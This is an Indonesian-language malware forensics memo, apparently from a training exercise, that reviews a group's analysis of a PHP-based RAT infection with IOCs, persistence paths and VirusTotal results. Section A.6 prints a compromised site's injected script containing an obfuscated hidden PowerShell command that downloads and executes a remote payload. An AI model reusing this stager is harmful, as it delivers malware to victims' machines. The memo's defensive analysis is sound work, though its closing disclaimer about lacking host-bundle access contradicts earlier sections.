### A.6 Initial Access Vector — DISCOVERED (Diskusi Tidak Punya)

File `Results-from-ChromeCacheView/2025-06-13-033443-UTC-from-www.truglomedsp_com.txt` (231.338 byte HTML) adalah halaman web `https://www.truglomedspa.com` (WordPress + WooCommerce med spa di Naples, Florida) **yang compromised**. Halaman mengandung script:

```html
<script>
window.ipGlobal='173.66.46.112';
window.xhrURIGlobal='https://hillcoweb.com/stat.php';
window.commandGlobal=`powershell -w h -nop -c "$ad='dng-,microsoftds,com'.Split(',');
$xe='htt'+'ps://'+$ad[0]+$ad[1]+'.'+$ad[2]+'/'+'Gsd'+'g4'+'97'+'6'+'.txt';
$wa=New-Object Net.WebClient;
$ss=$wa.('Download'+'String')($xe);
$zb='i'+'ex';
&$zb $ss"`;
window.path='truglomedspa.com';
</script>
```

**Decode string concatenation**:
1. `$ad = 'dng-', 'microsoftds', 'com'` (3 segments dari `dng-microsoftds.com` dengan split koma)
2. `$xe = 'https://' + 'dng-' + 'microsoftds' + '.' + 'com' + '/' + 'Gsd' + 'g4' + '97' + '6' + '.txt'` = `https://dng-microsoftds.com/Gsdg4976.txt`
3. `$wa = New-Object Net.WebClient` & `$ss = $wa.DownloadString($xe)` = download string dari URL
4. `$zb = 'i' + 'ex'` = `iex` (PowerShell alias untuk `Invoke-Expression`)
5. `&$zb $ss` = execute string yang didownload

**Catatan defensive**:
- `powershell -w h` = Window Hidden
- `-nop` = No Profile
- String concatenation untuk hide URL dari static AV scan
- Dynamic invocation `$wa.('Download'+'String')` & `$zb = 'i'+'ex'` untuk hide method/cmdlet names

**Attack chain rekonstruksi**:
1. `T+48` (15:34:43 UTC = 22:34:43 WIB): User buka `truglomedspa.com` di Edge → page load HTML
2. JS auto-execute `window.commandGlobal` (string di-decode browser)
3. `powershell -w h -nop -c "..."` run as child process Edge
4. Download `https://dng-microsoftds.com/Gsdg4976.txt` → string
5. `iex $ss` execute string → trigger drop c2.exe + BYOI PHP

**DNS confirmation** (semua ada di `ioc_case3.csv`):
- Line 149: `www.truglomedspa.com` (compromised site)
- Line 116: `hillcoweb.com` (JS stager delivery)
- Line 102: `dng-microsoftds.com` (PowerShell payload hosting)

**`2025-06-13-ChromeCacheView-events-from-Edge-Browser.txt`** (110.5K, UTF-16) mengkonfirmasi:
- Edge cache timestamp `6/13/2025 3:34:43 PM` (UTC, = 22:34:43 WIB)
- User access `https://www.truglomedspa.com` (filename `www.truglomedspa.com`)
- Real legitimate business site (med spa Naples FL) — bukan fake site
- 8,856 char JavaScript content asli dari `5h7o.js` (loaded dari `hillcoweb.com`)

### A.7 Persistence ctime Analysis (Insight Baru)

`ycBFVIbLl.lnk` ctime = `Fri Jun 13 08:35:37 2025` UTC.
Capture window mulai = `2025-06-13 15:33:55 UTC`.

Gap = **~6 jam 58 menit** antara persistence install & network capture. Ini artinya:
- Malware infection dimulai **jauh sebelum** PCAP capture (mungkin hari sebelumnya atau pagi UTC = sore/sore WIB hari itu).
- c2.exe + config.cfg + persistence sudah ter-install di host **sebelum** network capture yang kita analisis.
- PCAP capture hanya menangkap fase beaconing (post-infection), bukan fase instalasi awal.

Implikasi: ada fase **instalasi & setup** yang **tidak terlihat** di PCAP — mungkin dilakukan via channel lain (mis. HTTPS ke server berbeda, atau via PowerShell langsung tanpa network beaconing ke 3 domain C2 yang terlihat). Diskusi kelompok & v2.0 laporan tidak membahas gap ini.

### A.8 Forensic Notes (`2025-06-25-forensic-notes.txt`)

File ini adalah "answer key" resmi exercise (post-infection forensic notes, 12 hari setelah capture). Berisi list file yang ditemukan saat post-infection analysis:
```
C:\Users\rgaines\AppData\Roaming\afUGkp\c2.exe
C:\Users\rgaines\AppData\Roaming\afUGkp\ycBFVIbLl.lnk
C:\Users\rgaines\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ycBFVIbLl.lnk
C:\Users\rgaines\AppData\Roaming\php\[lots of files]
```

**File ini konfirmasi path yang disebut diskusi kelompok 100% benar.** Diskusi §5 di memo asli sudah benar: "tidak ada PDF answer key, validasi via PCAP↔bundle cross-correlation" — sekarang kita tahu validasi ini juga bisa via `2025-06-25-forensic-notes.txt` sebagai semi-official reference.

### A.9 Re-evaluation: Klaim Diskusi vs Realita (v2.1)

| Klaim diskusi | Status v2.0 | Status v2.1 (setelah bundle access) |
|---|---|---|
| BYOI download PHP dari `windows.php.net` | ✅ PCAP confirm | ✅✅ **Bundle confirm** (AppData\Roaming\php\ ada + 33 file PHP runtime) |
| Multi-tier beaconing ~30s | ⚠️ Diski simplifikasi | ⚠️ Diskusi simplifikasi (aktual 30/60/90/120s) — **koreksi tetap berlaku** |
| 3 C2 domain aktif | ✅ PCAP confirm | ✅✅ **Bundle confirm** (config.cfg `$h0b7d` array match) |
| 3 fallback IP hardcoded, 0 paket | ✅ PCAP confirm | ✅✅ **Bundle confirm** (config.cfg `$b2dL6` array match) |
| 62 C2 POST | ✅ Benar (count) | ✅ **Tetap benar** (PCAP-only verification) |
| `event-time-microsoft.org` & `eventdata-microsoft.live` (typosquat) | ✅ PCAP confirm (1 req each) | ✅ **Tetap benar** (PCAP-only verification) |
| Path generation time-based + XOR | ❌ Tidak bisa verify | ✅✅ **Bundle confirm** (`rxiXT()` function dengan 8 XOR constants + DateTime GMT+5) |
| Persistence (Run key + Startup .lnk) | ❌ Tidak bisa verify (host) | ✅✅ **Bundle confirm** (2× .lnk + `UrHlx()` function literal `reg add HKCU\…\Run` di config.cfg) |
| Keluarga malware Koi Loader/RAT | ⚠️ Hipotesis | ⚠️ **Masih hipotesis** (belum VT lookup). Confidence naik: pattern `gzencode(FORCE_GZIP) + pack("V") + 7-command array + Node.js cascade + Run key persistence` = konsisten dengan Koi/Koi Loader pattern (per ThreatIntel — perlu cross-check). |
| Laporan final klaim "fileless PowerShell" | ❌ Kontradiksi data | ❌ **Tetap kontradiksi** (PCAP + bundle keduanya tunjukkan ada binary launcher c2.exe) |

**Kesimpulan v2.1**: Diskusi kelompok **lebih akurat dari yang mereka sendiri tahu** — semua klaim teknis (path generation, persistence, command set, encoding) **match** dengan decode `config.cfg` aktual. Diskusi hanya **kurang** di 1 area: **initial access vector** (drive-by via compromised truglomedspa.com, hanya ada di Edge browser cache, bukan di `config.cfg` atau `c2.exe`).

### A.10 Rekomendasi Update untuk Diskusi Kelompok

Untuk `CASE3_FINDINGS.md`, saran edit minor:

1. **Tambah §3.6: Initial Access Vector** — compromised `truglomedspa.com` → JS inject PowerShell stager → `dng-microsoftds.com/Gsdg4976.txt` → `iex`. Tambahkan 3 domain ke IOC list sebagai "Initial Access" tier (terpisah dari "Initial Stager" typosquat Microsoft).

2. **Tambah §6.7: Initial Access Forensic Evidence** — reference ke `Results-from-ChromeCacheView/` dan decode script `window.commandGlobal`. Jelaskan string concatenation untuk evade static detection.

3. **Koreksi §4 timeline**: tambahkan T+48 (22:34:43 WIB / 15:34:43 UTC) = "Initial Access: user buka truglomedspa.com". Saat ini timeline mulai dari T+113 (PS recon) — ada gap T+48–T+113 yang tidak ter-explained.

4. **Tambah Appendix B+: SHA256 Table** — c2.exe + config.cfg + php.exe + ycBFVIbLl.lnk hashes untuk hash-based detection. Diskusi saat ini hanya punya `c2.exe` SHA256.

5. **Tambah §11.4: truglomedspa.com Post-Compromise** — rekomendasi untuk report situs compromised ke admin (med spa Naples FL) sebagai bagian dari responsible disclosure.

---

## UPDATE v2.3 (2026-06-21 malam) — VirusTotal Lookup Results

Iterasi keempat re-analisis: VT API lookup untuk 4 artefak utama. **Hasil utama**: diskusi kelompok + v2.0/v2.1/v2.2 laporan menyebutkan "Koi Loader/Koi RAT" sebagai hipotesis family — ini **SALAH**. Family sebenarnya per VT = **Agent_AGen.HR / Doina / Zusy**.

### B.1 VT Detection Results

| Artefak | SHA256 | VT Detections | Verdict | VT Type |
|---|---|---|---|---|
| c2.exe | `1206473a7c…` | **44/74 malicious (59.5%)** | **MALICIOUS CONFIRMED** | peexe |
| config.cfg | `a24cda6f…` | 1/74 malicious (1.4%) | Low detection (PHP obfuscation) | php (UTF-8 text) |
| php.exe | `b0c32fba…` | **0/75 malicious** | **CLEAN (legitimate PHP interpreter)** | peexe (console x86-64) |
| payload 968 KB | `9e2f538c…` | 5/76 malicious (6.6%) | Low detection (PS noise) | powershell |

### B.2 Family Attribution — Top 10 Detection Names c2.exe

| AV Engine | Detection Name | Family Indicator |
|---|---|---|
| **ESET-NOD32** | `Win64/TrojanDownloader.Agent_AGen.HR` | **Agent_AGen** family |
| **Fortinet** | `W64/Agent_AGen.HR!tr.dlr` | **Agent_AGen** family |
| **Microsoft** | `Trojan:Win64/Zusy.AHE!MTB` | **Zusy** family |
| **BitDefender** | `Gen:Variant.Doina.100728` | **Doina** variant |
| Emsisoft | `Gen:Variant.Doina.100728 (B)` | Doina variant |
| GData | `Gen:Variant.Doina.100728` | Doina variant |
| Avast/AVG | `Win64:MalwareX-gen [Misc]` | Generic trojan |
| McAfeeD | `ti!1206473A7C56` | Hash-based signature |
| Trellix | `Artemis!799411105C6F` | MD5-based signature |
| TrendMicro | `TROJ_GEN.R002C0DFT25` | Generic trojan |

**Family confirmed**: **Agent_AGen.HR** (Trojan Downloader family). Sub-variants:
- **Agent_AGen.HR** = primary designation (ESET, Fortinet)
- **Doina** = generic variant of Agent_AGen (BitDefender family)
- **Zusy** = Microsoft naming for the same family
- **MalwareX-gen** = generic trojan designation (Avast/AVG)

### B.3 VT Behavioral Tags untuk c2.exe

Tags: `long-sleeps, detect-debug-environment, clipboard, peexe, spreader, 64bits`

IOC tambahan dari tags:
- `long-sleeps` → RAT beacon dengan jeda panjang (consistent dengan multi-tier 30/60/90/120s)
- `detect-debug-environment` → sandbox evasion (consistent dengan mNFE9() cek privilege + WindowsPrincipal)
- `clipboard` → **confirms UTF-16 PS stager fallback** di c2.exe yang pakai `|clip` + `Get-Clipboard` (v2.2 finding)
- `spreader` → lateral movement capability (consistent dengan CMD=3 + EXE=0 commands)
- `64bits` → matches x86-64 PE

### B.4 Compiler Attribution (Corrected v2.3)

**v2.2 saya salah baca** dari string "GCC: (Rev2, Built by MSYS2 project)" di binary — string ini dari **libgcc library yang di-link**, bukan compiler utama.

VT TRID untuk c2.exe:
- **Microsoft Visual C++ compiled executable (generic)**: 41.1% probability
- Win64 Executable (generic): 26.1%
- Win16 NE executable (generic): 12.5%

**Compiler utama = MSVC** (per VT TRID probability 41.1%).

### B.5 Re-evaluasi Klaim Diskusi (v2.3 Final)

| Klaim diskusi | v2.0 | v2.1 | v2.2 | v2.3 (FINAL) |
|---|---|---|---|---|
| BYOI download PHP | ✅ PCAP | ✅ Bundle | ✅ | ✅✅ VT confirms php.exe CLEAN |
| Persistence | ✅ PCAP | ✅ Bundle | ✅ | ✅✅ VT tags `spreader` |
| Multi-tier beacon | ✅ PCAP | ✅ | ✅ | ✅✅ VT tags `long-sleeps` |
| UTF-16 PS stager di c2.exe | ❓ Unknown | ❓ Unknown | ✅ Found | ✅✅ VT tags `clipboard` confirms |
| **Family attribution: Koi Loader** | ⚠️ Hipotesis | ⚠️ Hipotesis | ⚠️ Hipotesis | ❌ **SALAH** — VT = Agent_AGen.HR |
| **Compiler: GCC** | — | — | ✅ (salah baca) | ❌ **SALAH** — VT = MSVC |

**Verdict v2.3 final**: Diskusi + semua versi laporan v2.0–v2.2 **salah atribusi family** ke "Koi Loader". Realitanya = **Agent_AGen.HR / Doina / Zusy** (Trojan Downloader family dengan PHP-based RAT extension). Ini **finding baru paling signifikan** di v2.3 — diskominfo yang dikonfirmasi via VT API.

### B.6 Rekomendasi Update untuk Diskusi Kelompok

Untuk `CASE3_FINDINGS.md`, koreksi penting:

1. **§6.3 (Kode Taktik) — koreksi malware family di MITRE mapping** dari "PHP-based RAT (Koi Loader/RAT family)" → "PHP-based RAT extension of Agent_AGen.HR / Doina / Zusy Trojan Downloader family"

2. **§2 (Vektor serangan) — hapus klaim Koi Loader** di line 1 tentang "RAT berbasis PHP (konsisten dengan keluarga Koi Loader/Koi RAT)". Ganti dengan "PHP-based RAT extension dari Agent_AGen.HR / Doina / Zusy family (Trojan Downloader) — confirmed via VirusTotal 44/74 detections."

3. **§6.2 (Algoritma C2) — tetap akurat** (semua function & algorithm match VT-validated bundle).

4. **§3.4 (C2 Fallback IP) — tetap akurat** (3 IP di config.cfg match).

5. **§6.4 (Recon) — tambahkan catatan**: "VT tags `detect-debug-environment` validates sandbox evasion via mNFE9() privilege check"

6. **§9 (Threat Intel Enrichment) — update family reference**: ganti "PHP-based RAT (Koi Loader?)" dengan "Agent_AGen.HR / Doina / Zusy (Trojan Downloader family, confirmed via VT 44/74 detections)"

7. **§11.4 (Hunt) — tambahkan behavioral IOC**: "VT tags: long-sleeps, detect-debug-environment, clipboard, spreader" sebagai additional hunt signature.

### B.7 API Key Security Reminder

**PENTING**: API key VT yang dipakai untuk lookup terekam di:
- `network-analysis/.env` (file lokal, di-ignore via `.gitignore`)
- Script `case3_vt_lookup.py` (line yang load .env, tidak hardcode key)
- Output terminal sesi ini (chat history)

**RECOMMENDED**: rotate API key setelah penelitian selesai (bisa dari dashboard VT: https://www.virustotal.com/gui/user/USERNAME/apikey). Free tier punya limit 4 lookup/minute, 500/day, 15.5K/month — penggunaan kita 4 lookup jadi aman.

---

## Appendix A — Sources of Truth

| Klaim | Source of truth | File di repo |
|---|---|---|
| First/last packet time | capinfos output | `output_compare/case3/capinfos_summary.txt` |
| Total packets, file size | capinfos output | sama |
| Suspicious POST (64) | pyshark/tcpdump | `output_compare/case3/summary_case3.json` |
| HTTP detail (request + response) | tshark/zeek-like | `output_compare/case3/http_summary.csv` |
| IOC list (IP, domain, URL, UA) | pyshark aggregation | `output_compare/case3/ioc_case3.csv` |
| Beacon intervals | diff(timestamps) | `output_compare/case3/beacon_intervals.csv` |
| TLS Client Hello + JA3 | tshark | `output_compare/case3/tls_ja3.csv` |
| Extracted file metadata | tshark http object export | `output_compare/cross_case/file_extraction_summary.csv` |
| GeoIP mapping | ip-api.com | `output_compare/case3/geo_data.csv` |
| DNS queries | tshark/zeek | (ada di `ioc_case3.csv` line 80-149) |

## Appendix B — Inkonsistensi Minor Diskusi Kelompok

| Lokasi di `CASE3_FINDINGS.md` | Masalah | Koreksi |
|---|---|---|
| Line 1, line 79 | "15:36 UTC", "T+0 = 15:33:55 UTC" | Label UTC salah, harusnya WIB (UTC+7) atau UTC eksplisit (15:33:55) |
| Line 4 | "Capture 2025-06-13 15:33:55–16:08:28 UTC" | Sama — harusnya 15:33:55–16:08:28 UTC = 22:33:55–23:08:28 WIB |
| Line 99 | "62 POST" | Benar count, tapi alasannya: 64 total - 1 WSDAPI - 1 PowerShell first = 62 |
| Line 100 | "interval ~30 dtk" | Multi-tier 30/60/90/120s, bukan uniform |
| Line 113-114 | "windows-msgas.com + event-datamicrosoft.live + trycloudflare" sebagai 3 domain | Plus 2 domain Microsoft-typosquat untuk initial stager (event-time-microsoft.org + eventdata-microsoft.live) |
| Line 209 | "Block/inspeksi Cloudflare tunnel egress" | Domain trycloudflare.com memang dipakai, tapi egress filtering by domain akan menangkap banyak legitimate use (any user with `cloudflared` CLI). Lebih baik block by anomaly (encrypted POST, no UA, regular interval). |
| Line 110-112 | "T1127 Trusted Developer Utilities / BYOI" + "PHP interpreter sah jalankan RAT" | Attack chain lebih akurat: PowerShell stager → drop c2.exe → c2.exe launches php.exe → php.exe executes config.cfg. T1127 di MITRE v15 sudah jadi sub-technique dari T1218 (System Binary Proxy Execution). |

---

**Memo ini disusun sebagai respon terhadap `CASE3_FINDINGS.md` diskusi kelompok. Verifikasi didasarkan pada data PCAP yang tersedia di repo, tanpa akses ke forensic-analysis bundle host.**
